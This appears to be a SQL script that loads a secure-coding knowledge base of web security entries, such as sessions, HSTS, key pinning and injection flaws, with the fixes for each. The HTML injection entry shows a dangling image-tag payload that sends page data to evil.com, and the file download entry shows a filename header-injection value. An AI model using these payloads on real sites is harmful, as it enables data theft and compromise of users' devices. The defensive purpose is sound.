INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# User restriction for sensitive dataNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAlways enforce multiple layers of security whenever you want to protect sensitive data/filesNEWLINEon your application. If one layer should fail the other layers should prevent the attackersNEWLINEfrom succeeding.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever sensitive data is stored on the server you should consider storing this data inNEWLINEa separate folder with permission rules in order to prevent unauthorized users toNEWLINEread these files. As an in depth solution you could also check if the session of the userNEWLINEhas sufficient privileges to read the files according to the level of authorization.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Missing authentication or authorizationNEWLINE- Sanitize sensitive data rapidly from memoryNEWLINE', 'User restriction for sensitive data'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Runtime environmentNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you use runtime environments you want to make sure these are not susceptible forNEWLINEbuffer overflows since this could lead to compromise of your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThere are a number of runtime solutions that can detect stack corruption and bufferNEWLINEoverruns or guard against attacks. These solutions typically terminate the programNEWLINEwhen an anomaly is detected, preventing the execution of arbitrary code.NEWLINE', 'Runtime environment'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Automatic variable bindingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the application framework allows automatic mass parameter assignmentNEWLINE(also called automatic variable binding) from the inbound request to a model,NEWLINEverify that security sensitive fields such as ''accountBalance'', ''role'' or ''password''NEWLINEare protected from malicious automatic binding. Whenever your application takes parametersNEWLINEin HTTPs GET statement and passes them as variables to code within the application thisNEWLINEcould become a safety hazard since the application processes these variablesNEWLINEin his operations.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhen working with automatic variable binding you should create whitelists of whatNEWLINEparameters are expected and allow only these parameters to be passed into yourNEWLINEapplication operation.NEWLINE', 'Automatic variable binding'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cryptographic function implementationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever cryptographic function is not implemented on the server side then theseNEWLINEcryptographic functions could easily be bypassed by an attacker.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all cryptographic functions used to protect secrets from the applicationNEWLINEuser are implemented server side.NEWLINE', 'cryptographic function implementation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cryptographic modules must fail securelyNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a cryptographic module does not fail securely this the device needs to be put inNEWLINEerror state so it''s not useable anymore.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWe recommend using the NIST standard on testing the cryptographic module making it performNEWLINEthe self-tests to see if it fails securely.NEWLINE', 'cryptographic modules must fail securely'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Verbose error messagingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn the development stage of an application programmers add debugging information on orderNEWLINEto debug certain functionalities. However, this stage often displays sensitive technicalNEWLINEinformation. If an attacker gains this technical information, he can learn more about theNEWLINEoperation of the application. The application should always display user-friendly messagesNEWLINEonly, when put on a live environment.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe level of debug information needs to be determined according to the environment whereNEWLINEthe code is running.NEWLINE', 'Verbose error messaging'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Access to any master secret must be protected from unauthorized accessNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAccess to any master secret must be protected from unauthorized access in order to protectNEWLINEthe integrity and the confidentiality of the data.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever sensitive data is stored on the server you should consider storing this data in aNEWLINEseparate folder with permission rules in order to prevent unauthorizedNEWLINEusers to read these files. It is also highly recommended to encrypt/hash the password inNEWLINEorder to enforce higher security.NEWLINE', 'Access to any master secret must be protected from unauthorized access'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Enforce policies for sensitive data processingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen you process data you should always enforce policies for the transfer of sensitive dataNEWLINEin order to enforce higher level of security imposing structured thresholds toNEWLINEfend of attackers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEFirst you have to create a list which contains locations of where all sensitive data isNEWLINEused and processed. Next, you create a policy that tells who is allowed and to what extendNEWLINEthey have privileges to look into which data. When this data moves through the network itNEWLINEshould always be encrypted (TLS) and also be stored encrypted. Thereafter you shouldNEWLINEestablish monitoring and testing methods to verify that everything stays encrypted andNEWLINEyour policy''s are properly enforced.NEWLINENEWLINEAlso, determine whenever data storage is necessary or becomes a redundancy.NEWLINEWhenever sensitive data does not have to be stored don''t store it. This reduces theNEWLINEquantity of data may your application ever be compromised.NEWLINENEWLINEUltimately, verify accessing sensitive data is logged, if the data is collected underNEWLINErelevant data protection directives or where logging of accesses is required.  NEWLINENEWLINESensitive data or primary keys, such as personally identifiable information or creditNEWLINEcards should also be anonymized, masked or truncated on the server before transmissionNEWLINEto the client.NEWLINE', 'Enforce policys for sensitive data processing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Access-control/Login systems - patternNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEFor successful access control/login functionality there are a lot of things to take intoNEWLINEconsideration before you start developing this type of functionality.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIt is highly recommended to study all the listed items and implement these principles inNEWLINEyour access control/login system in order to enforce a higher level of security.NEWLINENEWLINE1. Audit logsNEWLINE2. Principle of least privilege (Privilege based authentication system)NEWLINE3. Passwords must be encrypted, salted and stretchedNEWLINE4. Cross-Site Request Forgery (CSRF for authenticated forms)NEWLINE5. Session patternNEWLINE6. Session fixationNEWLINE7. Session hijackingNEWLINE8. Forget password functionsNEWLINE9. Client side authenticationNEWLINE10. Client side state managementNEWLINE11. cross sub domain cookie attackNEWLINE', 'Access control pattern'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Password forget function - patternNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you are implementing a forgot password function into your system there areNEWLINEa few things you need to take into consideration in order to prevent security flawsNEWLINEin your application.NEWLINENEWLINE1. Forget password functionsNEWLINE2. Denial of service by locking out accountsNEWLINE3. Username enumerationNEWLINE4. Does The application enforce the use of secure passwordsNEWLINE5. Disallow the use of old passwordsNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe first thing is to verify that forgot password and other recovery pathsNEWLINEsend a link including a time-limited activation token rather than the password itself.NEWLINENEWLINEAdditional authentication based on soft-tokensNEWLINE(e.g. SMS token, native mobile applications, etc.) can be required as well beforeNEWLINEthe link is sent over.NEWLINENEWLINESecond, you should not lock out the users account whilst the process of getting a newNEWLINEpassword is in progress. This could lead to a Denial of service attack whenever anNEWLINEattacker decides to intentionally lock out the users with an automated attack.NEWLINENEWLINEThird, whenever the new password request was set in progress, the message you displayNEWLINEshould be generalized in order to prevent username enumeration.NEWLINENEWLINEFourth, always disallow the use of old passwords and implement a strong password policy.NEWLINE', 'Password forget pattern'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sessions - patternNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen working with sessions there are a couple of things you need to consider in orderNEWLINEto implement them securely throughout your system. For more detailed information aboutNEWLINEthese items you should check the knowledge-base about:NEWLINENEWLINE1.  Session management controlNEWLINE2.  Session cookies without the Secure flagNEWLINE3.  Session cookies without the HttpOnly flagNEWLINE4.  External session hijackingNEWLINE5.  Insecure transmission of session cookiesNEWLINE6.  Session information is not stored server sideNEWLINE7.  Session ids should be generated with sufficient entropy, preferred is the frameworks default session management control implementation is used by the applicationNEWLINE8.  User generated session ids should be rejected by the serverNEWLINE9.  The logout functionality should revoke the complete sessionNEWLINE10. The login functionality should always generate (and use) a new session idNEWLINE11. Session IDs do not timeout.(idl)NEWLINE12. Absolute session time outNEWLINE13. Verify that the session id is never disclosedNEWLINE14. Session cookies (Domain)NEWLINENEWLINE## Solution:NEWLINENEWLINEThe items as pointed out before should be looked into and taken into considerationNEWLINEwhenever you are working with sessions on your system in order to enforce aNEWLINEhigh level of security.NEWLINE', 'Sessions pattern'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Submit forms - patternNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user can submit a form in your system you should consider implementingNEWLINEthe following defense mechanism in order to ensure high level security.NEWLINENEWLINE1.  Single user input validation controls and Audit logsNEWLINE2.  CSRF tokensNEWLINE3.  Principle of least privilegeNEWLINE4.  GET/POST requestsNEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEHere are the steps described briefly.NEWLINEFor more detailed information you should look into these items in the knowledge base.NEWLINENEWLINEFirst, you should create a single user input validation control class which shouldNEWLINEvalidate the expected input values in order to verify if the user is not tampering dataNEWLINEor is injecting malicious code into your application. All infringements should be loggedNEWLINEand repercussions should be taken whenever these infringements are frequent.NEWLINENEWLINESecond, whenever an authenticated user is submitting the form always ensure the formsNEWLINEcontain CSRF tokens in order to prevent cross site request forgery.NEWLINENEWLINEThird, Whenever there are authenticated users with different roles/privileges you shouldNEWLINEenforce restrictions on the server side upon your form submits/processing in orderNEWLINEto prevent privilege escalation. You should apply the principle of least privilege inNEWLINEorder to ensure higher level of security.NEWLINENEWLINEFourth, Whenever the application is sending sensitive data through the form submitNEWLINEthis data must always be send through an POST variable instead of an GET sinceNEWLINEa GET will leak this data through the url by example the referrer header.NEWLINE', 'Submit forms pattern'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Column truncation sql injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an applications structural logic mismatches with the database structural logicNEWLINEan attacker gains the opportunity to truncate his submit towards your database column byNEWLINEsubmitting a value longer then the limit allowed in the database.NEWLINENEWLINEImagine you have a system where users can register themselves.NEWLINENEWLINEThe attacker can abuse this behavior of the database to overflow the length limitNEWLINEand truncate his submit and register himself as the admin, thus gaining itsNEWLINEprivileges.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEOn critical places where unique values are enforced and expectedNEWLINEsuch as usernames in order to authorize or distribute certain privileges. The users submitNEWLINEshould be checked on the server side in order to verify if it does not exceed the limitNEWLINEset in your database.NEWLINE', 'SQL injection Column truncation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# User registration - patternNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you allow users to register on your system there are a couple of things you needNEWLINEto take into consideration in order to enforce a high level of securityNEWLINEFor more detailed information about these items you should check the knowledge-base about:NEWLINENEWLINE1. Column truncation sql injection(for mysql databases)NEWLINE2. Single input validation controls  NEWLINE2. Audit logsNEWLINE3. Prevent password leakingNEWLINE4. Predictable password and or token generationNEWLINE5. Are all passwords hashed, salted and stretchedNEWLINE6. Does The application enforce the use of secure passwords.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe items as pointed out before should be looked into and taken into considerationNEWLINEwhenever you are letting users register on your system in order to enforce aNEWLINEhigh level of security.NEWLINENEWLINEHere are the steps described briefly.NEWLINEFor more detailed information you should look into these items in the knowledge base.NEWLINENEWLINEFirst, You enforce limits on the length of the users submits on the server side in orderNEWLINEto prevent him from truncating his submits. These limits have to correlate with the limitsNEWLINEyou set in your column in the database.NEWLINENEWLINESecond, you should create a single user input validation control class which shouldNEWLINEvalidate the expected input values in order to verify if the user is not tampering dataNEWLINEor injecting malicious code into your application. All infringements should be loggedNEWLINEand repercussions should be taken whenever these infringements are frequent.NEWLINENEWLINEThird, never display the users password on screen anywhere.NEWLINENEWLINEFourth, Whenever you generate a password for your users, this password should alwaysNEWLINEbe randomized sufficiently.NEWLINENEWLINEFifth, encrypt your passwords by proven cryptographic standards when storing them.NEWLINENEWLINESixth, Enforce secure passwords by implementing good password policies.NEWLINE', 'User registration pattern'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cross subdomain cookie attacksNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA quick overview of how it works:NEWLINENEWLINE1. A web site www.example.com hands out subdomains to untrusted third partiesNEWLINE2. One such party, Mallory, who now controls evil.example.com, lures Alice to her siteNEWLINE3. A visit to evil.example.com sets a session cookie with the domain .example.com on Alice''s browserNEWLINE4. When Alice visits www.example.com, this cookie will be sent with the request, as the specs for cookies states, and Alice will have the session specified by Mallory''s cookie.NEWLINE5. Mallory can now use Alice her account.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn this scenario changing the sessionID on login does not make any difference sinceNEWLINEAlice is already logged in when she visits Mallory''s evil webpage.NEWLINENEWLINEIt is good practice to use a completely different domain for all trusted activity.NEWLINENEWLINEFor example Google uses google.com for trusted activities and *.googleusercontent.comNEWLINEfor untrusted sites.NEWLINENEWLINEAlso when setting your cookies to specify which domains they are allowed toNEWLINEbe send to. Especially on your trusted domain you do not want to leak cookies to unintendedNEWLINEsubdomains. highly recommended is to not use wildcards when setting this option.NEWLINE', 'cross subdomain cookie attack'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTML injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an attacker can inject HTML in your application there is a variety of differentNEWLINEattacks he could perform such as:NEWLINENEWLINE1. Content SpoofingNEWLINE2. Image Tag Injection 	NEWLINE3. Form ReroutingNEWLINE4. Base JumpingNEWLINE5. Element OverrideNEWLINE6. Hanging TextareaNEWLINENEWLINEEven when your application intercepts XSS injections by means of a content security policyNEWLINEheader it still remains vulnerable to the attacks summarized above.NEWLINENEWLINE## Solution:NEWLINENEWLINE1.Content spoofing Otherwise known as "Content Injection" or "Virtual Defacement" occursNEWLINEwhenever an attacker can inject code into your application. It is very important to sanitize andNEWLINEor encode user data before you display it on screen as HTML.NEWLINENEWLINE2.Image tag injection occurs whenever an attacker injects a broken image tag with a non terminatedNEWLINEparameter like : "img src=''http://evil.com?steal.php?value=NEWLINEEvery content after value= parameter will now be stolen and send to evil.com by the attackerNEWLINEtill the injection finds the next occurrence of a matching single quote.NEWLINENEWLINEAgain you should sanitize and encode the user-input to prevent an image tag from being injectedNEWLINEin your application. For whenever a user is permitted to submit an image on your applicationNEWLINEenforce and verify the application accepts valid non-broken tags only.NEWLINENEWLINE3.The "form" tag can''t be nested. The top-level occurrence of this elementNEWLINEalways takes precedence over subsequent appearances. Again you must avoid this type byNEWLINEproperly encoding and sanitizing your user-inputs.NEWLINENEWLINE4.Whenever an attacker injects a "base" tag into your application it can steal data becauseNEWLINEthe <base> tag specifies the base URL/target to where to process his data to.NEWLINENEWLINEThe solution to base jumping would be to us absolute paths in your application such as:NEWLINEaction=''/update_profile.php''NEWLINENEWLINEinstead of:NEWLINEaction=''update_profile.php''NEWLINENEWLINE5/6 can both also easily be prevented simply be encoding or sanitizing your user-inputNEWLINEsubmitted towards your application.NEWLINENEWLINEAlways validate your user-input on a high level(server side constraint). Whenever yourNEWLINEapplication expects an integer you should validate and check whether the user submittedNEWLINEinput really is what you expected it to be and otherwise you terminate and log the request.NEWLINE', 'HTML injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Debug enablingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESometimes it is possible through an "enabling debug parameter" to display technicalNEWLINEinformation within the application. As a result the attacker learns more about theNEWLINEoperation of the application, increasing his attack vector.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDisable the possibility to enable debug information on a live environment.NEWLINE', 'Debug enabeling'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Reflective file download and File download injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEReflective file download occurs whenever an attacker can "forge" a download throughNEWLINEmisconfiguration in your "disposition" and "content type" headers. Instead of havingNEWLINEthe attacker to upload a evil file to the webserver he can now force the browser toNEWLINEdownload a malicious file by abusing these headers and setting the file extension to anyNEWLINEtype he wants.NEWLINENEWLINENow, whenever there is also user-input being reflected back into that download it can beNEWLINEused to forge evil attacks. The attacker can present an evil file to ignorant victim''s whoNEWLINEare trusting the domain of which the download was presented from.NEWLINENEWLINEFile download injection is a similar type of attack except this attack is made possibleNEWLINEwhenever there is user-input that is reflected into the "filename=" parameter in theNEWLINE"disposition" header. The attacker again can force the browser to download a file with hisNEWLINEown choice of extension and set the content of this file by injecting this directlyNEWLINEinto the response like: filename=evil.bat%0A%0D%0A%0DinsertEvilStringHereNEWLINENEWLINEWhenever the user now opens the downloaded file the attacker can gain full control overNEWLINEthe targets device.NEWLINENEWLINE## Solution:NEWLINENEWLINEFirst of all never use user-input directly into your headers since an attacker can nowNEWLINEtake control over it.NEWLINENEWLINESecondly you should check if a filename really does exist beforeNEWLINEpresenting it towards the users. You could also create a whitelist of all files whichNEWLINEare allowed to be downloaded and terminate requests whenever they do not match.NEWLINENEWLINEAlso you should disable the use of "path parameters". It increases the attackers attackNEWLINEvector and these parameters also cause a lot of other vulnerabilities.NEWLINENEWLINEAnd last you should sanitize and encode all your user-input as much as possible.NEWLINEReflective file downloads depends on user-input being reflected in the response header.NEWLINEWhenever this input has been sanitized and encoded it should not do any harm to anyNEWLINEsystem it is being executed on.NEWLINE', 'RFD and file download injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Identify all application componentsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen you are building an application you first want to map where you are placingNEWLINEsource files, libraries and executables.NEWLINENEWLINEWith these components identified and mapped, it becomes transparent where possibleNEWLINEpitfalls might be in your application and increases the maintainability of theNEWLINEsystem. Also you have an indicator where possible reinforcements have to beNEWLINEimplemented to avoid attacks.(i.e places where your application contains executable''s)NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all application components (either individual or groups of source files,NEWLINElibraries, and/or executables) that are present in the application are identified.NEWLINENEWLINEWhen you identified these components you may want to map and document them in order toNEWLINEhave a quick reference to this infrastructure when needed.NEWLINE', 'identify all application components'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Identify all external dependenciesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESometimes your application has certain external dependencies which may stronglyNEWLINEinfluence your application''s operation. These external dependenciesNEWLINEmight become an attackers target since compromising that service might lead toNEWLINEa DoS of your system or influence the system in such a way it leaves room for otherNEWLINEattacks.NEWLINENEWLINE## Solution:NEWLINENEWLINEFirst you must identify which external dependencies your application relays onNEWLINEfor its operation. Second, there should be a fail safe implemented should this dependency everNEWLINEfail to deliver its services towards your application.NEWLINE', 'identify external dependencies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# High level architecture should be defined.NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you are developing an application you want to map all the architectureNEWLINEit contains. Whenever there are breaches, updates, or other escalations it makes itNEWLINEeasy and transparent for forensics, operators and developers to do their job as fast asNEWLINEpossible.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that a high-level architecture for the application has been defined. This meansNEWLINEsome sort of a technical resign has to be composed about this architecture and all theNEWLINEelements it provides. This gives a visual representation about your application andNEWLINEmakes it easier to work through.NEWLINENEWLINEWhile you are mapping your application architecture you should also addNEWLINEall other components your application contains in terms of business functions and/orNEWLINEsecurity functions they provide.  NEWLINENEWLINEWhen you map these components it becomes more transparent about different types ofNEWLINEsecurity mitigations that might be forgotten for some of your business functions. BecauseNEWLINEagain, you now own a visual representation of this logic. Your application also becomesNEWLINEmore manageable in terms of keeping up with the latest security updates and patches andNEWLINEgives you a better view of obsolete configurations, functions and components whichNEWLINEcan be removed from the system.NEWLINE', 'High level architecture should be defined'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Threat modelingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThreat modeling is a procedure for optimizing Network/ Application/ Internet Security byNEWLINEidentifying objectives and vulnerabilities, and then defining countermeasures to prevent,NEWLINEor mitigate the effects of, threats to the system. A threat is a potential or actualNEWLINEundesirable event that may be malicious (such as DoS attack) or incidentalNEWLINE(failure of a Storage Device). Threat modeling is a planned activity for identifying andNEWLINEassessing application threats and vulnerabilities.NEWLINENEWLINE## Solution:NEWLINENEWLINEThreat modeling is best applied continuously throughout a software development project.NEWLINEThe process is essentially the same at different levels of abstraction, although theNEWLINEinformation gets more and more granular throughout the life-cycle. Ideally, a high-levelNEWLINEthreat model should be defined in the concept or planning phase, and then refinedNEWLINEthroughout the life-cycle. As more details are added to the system, new attack vectors areNEWLINEcreated and exposed. The ongoing threat modeling process should examine, diagnose, andNEWLINEaddress these threats.NEWLINENEWLINENote that it is a natural part of refining a system for new threats to be exposed.NEWLINEFor example, when you select a particular technology -- such as Java for example --NEWLINEyou take on the responsibility to identify the new threats that are created by that choice.NEWLINEEven implementation choices such as using regular expressions for validation introduceNEWLINEpotential new threats to deal with.NEWLINENEWLINEMore in-depth information about threat modeling can be found at:NEWLINEhttps://www.owasp.org/index.php/Application_Threat_ModelingNEWLINE', 'Threat modeling'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Differential analysis attackNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an attacker sends a request to the server, in example by means of anNEWLINEauthentication functionality. He can measure the average response time between a requestNEWLINEcontaining a valid username and a request containing a invalid username. TheNEWLINEattacker can now use this differential in response time to enumerate user accounts.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all authentication challenges, whether successful or failed, should respondNEWLINEin the same average response time.NEWLINE', 'Differential analysis attack'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client side input validationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAs web applications become more advanced, an increasing amount of HTML is generated byNEWLINEJavaScript on the client-side rather than by the server. Any time content needs to beNEWLINEchanged without refreshing the entire page, the update must be performed using JavaScript.NEWLINEMost notably, this is the case when a page is updated after an AJAX request.NEWLINENEWLINEXSS vulnerabilities can be present not only in your website''s server-side code, but alsoNEWLINEin your website''s client-side JavaScript code. Consequently, even with completelyNEWLINEsecure server-side code, the client-side code might still unsafely include user input in aNEWLINEDOM update after the page has loaded. If this happens, the client-side code has enabledNEWLINEan XSS attack through no fault of the server-side code.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEFirst there must be a client side input validation method as you would apply to the serverNEWLINEside. This means you should also apply input rejection as well as typecasting and such.NEWLINEThis is to prevent users from being attacked by XSS attacks which are undetectable byNEWLINEthe server.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Positive validation methodNEWLINE- Single input validation controlsNEWLINE- Input rejectionNEWLINE- Input validationNEWLINE', 'Client side validation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('Positive validation modelNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThere are two popular methods in handling input validation. The first is blacklistingNEWLINEand the second one is the whitelisting method, also known as a positive validation model.NEWLINENEWLINEThe big disadvantage of the blacklisting model would be that an attacker has a greatNEWLINEdiversity into forging his attack strings and payloads which can make it hard for yourNEWLINEapplication to detect all of them. It would also be very time consuming importing all of NEWLINEthem into your system.NEWLINENEWLINEWhenever you are using a positive validation model you are simply checking for the input NEWLINEyou were expecting as defined in your applications operation, for example:NEWLINENEWLINELet''s say you have a form and was expecting the form to return the value of a check-box.NEWLINEThis would be a fixed value, yes or no. Whenever the value diverges of the expectedNEWLINEinput as was intended in the applications operation you can now assume there was anNEWLINEintercepting proxy tampering these values and act accordingly to it.NEWLINENEWLINESame goes for whenever you were expecting just a string, integer, alphanumeric characterNEWLINEor even special strings such as names as an o''reily.NEWLINENEWLINEThis methods also makes your code clear, transparent and highly maintainable.NEWLINENEWLINE## Solution:NEWLINENEWLINEFirst there must be a client side input validation method as you would apply to the serverNEWLINEside. This means you should also apply input rejection as well as typecasting and such.NEWLINEThis is to prevent users from being attacked by XSS attacks which are undetectable byNEWLINEthe server.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Single input validation controlsNEWLINE- Input rejectionNEWLINE- Input validationNEWLINENEWLINENEWLINENEWLINENEWLINE   NEWLINE', 'Positive validation model'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# TLS certificate public key pinningNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEPinning is the process of associating a host with their expected X509 certificate orNEWLINEpublic key. Once a certificate or public key is known or seen for a host, the certificateNEWLINEor public key is associated or ''pinned'' to the host. If more than one certificate orNEWLINEpublic key is acceptable, then the program holds a pinsetNEWLINE(taking from Jon Larimer and Kenny Root Google I/O talk). In this case, the advertisedNEWLINEidentity must match one of the elements in the pinset.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe idea is to re-use the existing protocols and infrastructure, but use them in aNEWLINEhardened manner. For re-use, a program would keep doing the things it used to do whenNEWLINEestablishing a secure connection.NEWLINENEWLINETo harden the channel, the program would take advantage of the OnConnect callback offeredNEWLINEby a library, framework or platform. In the callback, the program would verify theNEWLINEremote host''s identity by validating its certificate or public key. While pinning doesNEWLINEnot have to occur in an OnConnect callback, its often most convenient because theNEWLINEunderlying connection information is readily available.NEWLINENEWLINEFor more extended information on different types of implementation please see:NEWLINEhttps://www.owasp.org/index.php/Certificate_and_Public_Key_PinningNEWLINE', 'TLS certificate public key pinning'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HSTS preload listNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHTTP Strict-Transport-Security (HSTS) allows sites to specify that they should be accessedNEWLINEvia a secure connection only. The problem is, a user''s first request to a site employingNEWLINEHSTS may not be over HTTPS. A preload list will allow us to ship Firefox with someNEWLINEpre-set HSTS sites that, from the first time they''re accessed in the browser, will requireNEWLINEa secure connection.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn order to be included on the HSTS preload list, your site must:NEWLINENEWLINE1. Have a valid certificate (which must expire before 2016 if it uses SHA-1).NEWLINE2. Redirect all HTTP traffic to HTTPS—i.e. be HTTPS only.NEWLINE3. Serve all subdomains over HTTPS, specifically including the www subdomain if a DNSNEWLINErecord for that subdomain exists.NEWLINE4. Serve an HSTS header on the base domain:NEWLINE* Expiry must be at least eighteen weeks (10886400 seconds).NEWLINE* The includeSubdomains token must be specified.NEWLINE* The preload token must be specified.NEWLINE* If you are serving a redirect, that redirect must have the HSTS header, not the page itNEWLINE  redirects to.NEWLINENEWLINEFor more details on HSTS, please see RFC 6797. Note that the preload flag in the HSTSNEWLINEheader is required to confirm and authenticate your submission to the preload list.NEWLINEAn example valid HSTS header:NEWLINENEWLINE    Strict-Transport-Security: max-age=10886400; includeSubDomains; preloadNEWLINENEWLINEAdding your website to the list:NEWLINEhttps://www.chromium.org/hsts     NEWLINENEWLINENEWLINESource:NEWLINEhttps://wiki.mozilla.org/Privacy/Features/HSTS_Preload_ListNEWLINE', 'HSTS preload'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Robots.txtNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEEach site uses a robots.txt file which allows search engines to provide information.NEWLINEThe robots.txt determines what pages may or may not be indexed by google or yahoo etc.NEWLINEHowever, a common mistake made by programmers is applying a blacklisting method causingNEWLINEthe application displaying sensitive information to attackers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEInstead of the blacklisting method:NEWLINENEWLINEUser-agent: *NEWLINEDisallow: /squirrelmail/NEWLINEDisallow: /admin/NEWLINEDisallow: /modules/NEWLINENEWLINEYou should use a whitelisting method:NEWLINENEWLINEUser-agent: *NEWLINEDisallow: *NEWLINEAllow: /index.htmlNEWLINEAllow: /home.htmlNEWLINE', 'Robots.txt'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Forward secrecy cyphersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn cryptography, forward secrecy (FS; also known as perfect forward secrecy, or PFS)NEWLINEis a property of key-agreement protocols ensuring that a session key derived from a setNEWLINEof long-term keys cannot be compromised if one of the long-term keys is compromised in theNEWLINEfuture. The key used to protect transmission of data must not be used to derive anyNEWLINEadditional keys, and if the key used to protect transmission of data is derived from someNEWLINEother keying material, then that material must not be used to derive any more keys.NEWLINEIn this way, compromise of a single key permits access only to data protected by thatNEWLINEsingle key.NEWLINENEWLINE## Solution:NEWLINENEWLINEIn the beginning SSL handshake, the client sends a list of supported ciphersuitesNEWLINE(among other things). The server then picks one of the ciphersuites, based on a ranking,NEWLINEand tells the client which one they will be using.NEWLINENEWLINEThis step is the one that determines whether or not the future connection will haveNEWLINEperfect forward secrecy. Note that, at this point, certificates have not entered theNEWLINEpicture at all. This is because whether or not a connection has perfect forward secrecyNEWLINEis determined by how the session key is derived. And how the session key is derived isNEWLINEdetermined by the ciphersuite in use. So, the ciphersuites that use ephemeralNEWLINEDiffie-Hellman (DHE) or the elliptic-curve variant (ECDHE) will have perfect forwardNEWLINEsecrecy while the other options will not.NEWLINE', 'Forward secrecy ciphers'); 
